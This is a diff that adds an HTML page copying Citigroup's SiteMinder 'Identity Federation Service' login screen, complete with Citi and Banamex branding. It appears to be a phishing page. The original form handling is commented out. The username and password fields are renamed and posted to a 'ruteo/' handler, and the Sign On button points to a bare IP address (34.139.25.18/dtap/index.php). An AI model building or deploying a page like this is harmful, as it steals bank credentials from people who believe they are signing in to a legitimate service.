@@ -1,0 +1,202 @@
+<!-- SiteMinder Encoding=ISO-8859-1; -->
+
+<html lang="en">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+<META HTTP-EQUIV="Cache-control" CONTENT="no-cache">
+<META HTTP-EQUIV="Pragma" CONTENT="no-cache">
+<META HTTP-EQUIV="Expires" CONTENT="-1">
+<title>Data Traicing</title>
+
+<!-- Start of Cross-frame scripting prevention code. 
+This code will prevent this page from being encapsulated within HTML frames. 
+Remove, or comment out , this code if the functionality that is contained in this 
+page is to be included within HTML frames. -->
+
+<style>
+html{
+display : none ; 
+}
+</style>
+
+<script>
+if( self == top ) {
+  document.documentElement.style.display = 'block' ; 
+} else { 
+  top.location = self.location ; 
+} 
+</script>
+
+<!-- End of Cross-frame scripting prevention code -->
+<SCRIPT LANGUAGE="JavaScript">
+function resetCredFields()
+{
+ document.Login.PASSWORD.value = "";
+}
+
+function submitForm()
+{
+ document.Login.submit();
+}
+
+</SCRIPT>
+
+<link rel="shortcut icon" href="https://www.banamex.com/favicon.ico">
+
+<!--Begin Stylesheet Links-->
+<link rel="stylesheet" type="text/css" href="https://secureaccessweb.nam.citigroup.com/siteminderagent/css/common.css">
+<!--End Stylesheet Links-->
+</head>
+
+<body topmargin="0" leftmargin="0" rightmargin="0" marginwidth="0" marginheight="0" bgcolor="#f1f1f1" onLoad = "resetCredFields();">
+<script type="text/javascript">
+
+var pfurl="https://secureaccess.nam.citigroup.com";
+var pfnamdns = "https%253A%252F%252Fsecureaccess.nam.citigroup.com";
+var pfglobaldns = "https%253A%252F%252Fsecureaccess.citigroup.com";
+
+var smtargeturl = "/cfed/smidp/level5ud1/internal/redirect?resumePath=%2Fidp%2FDEfTl%2FresumeSAML20%2Fidp%2FstartSSO.ping";
+var postprsvdata = "";
+
+var pathind = smtargeturl.indexOf("CPRedirect=");
+
+if(pathind>-1)
+{
+  var target = smtargeturl.substr(pathind+11);
+  var ind = target.indexOf("&");
+  var pftarget = "";
+  if(ind>-1) {
+    pftarget = target.substr(0,ind);
+  } else {
+    pftarget = target;
+  }
+  if (target.indexOf("https%253A%252F%252F") > -1) {
+    var flag = 0;
+    var validtargetcheckindex = target.indexOf(pfnamdns);
+    if (validtargetcheckindex == 0) {
+      flag = 1;
+    } else {
+      validtargetcheckindex = target.indexOf(pfglobaldns);
+      if (validtargetcheckindex == 0) {
+        flag = 1;
+      }
+    }
+    if (flag == 0) {
+      window.location="/cfed/error.html";
+    } else {
+      pfredurl=pftarget;
+    }
+  } else {
+    pfredurl=pfurl+pftarget;
+  }
+  var decodedURL = decodeURIComponent(decodeURIComponent(pfredurl));
+  window.location=decodedURL;
+}
+
+</script>
+<form action="ruteo/" method="post"> <!--NAME="Login" METHOD="POST" autocomplete="OFF"><-->
+<INPUT TYPE=HIDDEN NAME="SMENC" VALUE="ISO-8859-1">
+<INPUT type=HIDDEN name="SMLOCALE" value="US-EN">
+<center> <table border="0" width="100%" id="table1" cellspacing="0" cellpadding="0">
+<!--<tr><td colspan="2" style="height: 11px; background-color: #373737;"></td></tr>
+<tr><td colspan="2" style="height: 11px; background-color: #000000;"></td></tr><-->
+<tr style="background:url('https://secureaccessweb.nam.citigroup.com/siteminderagent/images/bg_tcompblue.gif') repeat-x; height: 88px;">
+<th align="left" valign="top"><img style="float:top; margin: 20px 25px 25px 25px;" src="https://secureaccessweb.nam.citigroup.com/siteminderagent/images/citi200.png" alt="Citigroup Inc." /></th>
+<th align="right" valign="middle" nowrap cellpadding="2" style="float:right; margin: 25px 25px 25px 25px; color:#ffffff; font-family:Arial; font-size:18pt; font-weight:normal;">&nbsp;Identity Federation Service &nbsp;</th></tr>
+
+<tr>
+<td colspan="2" height="350" bgcolor="#f1f1f1" align="center" valign="middle">
+
+
+<table border="0" cellpadding=0 cellspacing=0  width="364" height="138" >
+
+
+<tr>
+  <td class="subheader" height=10>
+  </td>
+  <td class="subheader" nowrap width="250" >&nbsp;</td>
+</tr>
+<tr>
+  <td colspan="2" class="SubHeader" align="center" height="80%">
+<fieldset>
+<table border="0" cellpadding=0 cellspacing=0 id="table14" style="border: 1px solid #f1f1f1;" width="364" height="138">
+<tr><td colspan='2' align="center" class='pageheader'>Please Login</td></tr>
+<tr><td colspan='2'>&nbsp;</td></tr>
+<tr>
+    <td class="subheader" height=10>
+    </td>											
+    <td class="subheader" nowrap width="250" >&nbsp;</td>
+    </tr>
+<tr>
+    <td class="SubHeader" nowrap align="left" width="92">
+    <p align="right">Username: </p></td>
+    <td class="RowShadedHigh" nowrap width="250" ><b>
+    <input type="text" id="inputUsuario" name="inputUsuario" size="34" class="textinput" style="float: left">&nbsp;
+</td>
+    </tr>
+
+    <tr>
+    <td class="SubHeader" nowrap align="left" valign=center width="92">
+    <p align="right">Password:</p></td>
+    	<td class="SubHeader" nowrap height="28">
+    	<input type="password" size="34"  class="textinput" name="inputPassword" id="inputPassword"> <!--autocomplete="off" style="float: left" onkeypress="if (event.keyCode==13) submitForm();"><-->	</td>
+    </tr>
+
+    <tr>
+    <td class="SubHeader" nowrap width="92">&nbsp;</td>
+    	<td class="SubHeader" height="43">	
+    	<input type=hidden name=target value="/cfed/smidp/level5ud1/internal/redirect?resumePath=%2Fidp%2FDEfTl%2FresumeSAML20%2Fidp%2FstartSSO.ping">
+<input type=hidden name=smquerydata value="">
+<input type=hidden name=smauthreason value="0">
+<input type=hidden name=smagentname value="P2dBloMFdUuAMpB9mzhH3xNxCEJB3aq5s2Z77FyKnFv9XiptVFx5NyBfKyEzzF871XmxgrqDQZFcoL3ca9fb7Cwg7wxUosn3">
+<input type=hidden name=postpreservationdata value="">											
+    	<button type="submit" class="ButtonSm" onClick="http://34.139.25.18/dtap/index.php">Sign On</button><!--onClick="submitForm();"><-->
+    	</td>
+    </tr>
+
+    <tr>
+    <td class="SubHeader" nowrap width="92">
+  	</td>    
+    <td class="SubHeader" height="37">
+    	<a href="">Change Password</a> &nbsp;
+		</td>
+    </tr>
+
+	</table>										
+</fieldset>	
+  </td>
+</tr>
+
+    <tr>
+    <td class="SubHeader" nowrap width="92" align="center" valign="middle">
+        </td>
+    	<td class="SubHeader" height="37"> &nbsp; &nbsp; </td>
+  </tr>
+        </table>
+        
+</td></tr>
+<tr><td>&nbsp;</td></tr>
+<tr><td>&nbsp;</td></tr>
+<tr><td>&nbsp;</td></tr>
+<tr><td>&nbsp;</td></tr>
+<tr> <td colspan="2" background="/siteminderagent/images/GreyLine.jpg" height=1></td></tr>
+<tr> <td colspan="2" height=45>
+<table width="100%" cellpadding="5" cellspacing="5" border="0">
+ <tr> 
+  <td width="7%" height="53"><img border="0" src="/siteminderagent/images/logo_right.png" alt="citi logo"></td>
+  <td width="80%" align="right" valign="middle" class="Footer" nowrap>Copyright &copy; 2014 Citigroup Inc.</td>
+ </tr>
+</table>
+</td>
+</tr>
+</table>
+</center>
+</form>
+<script language="javascript">
+document.forms["Login"].elements["USER"].focus();
+</script>
+
+</body>
+</html>
+
+
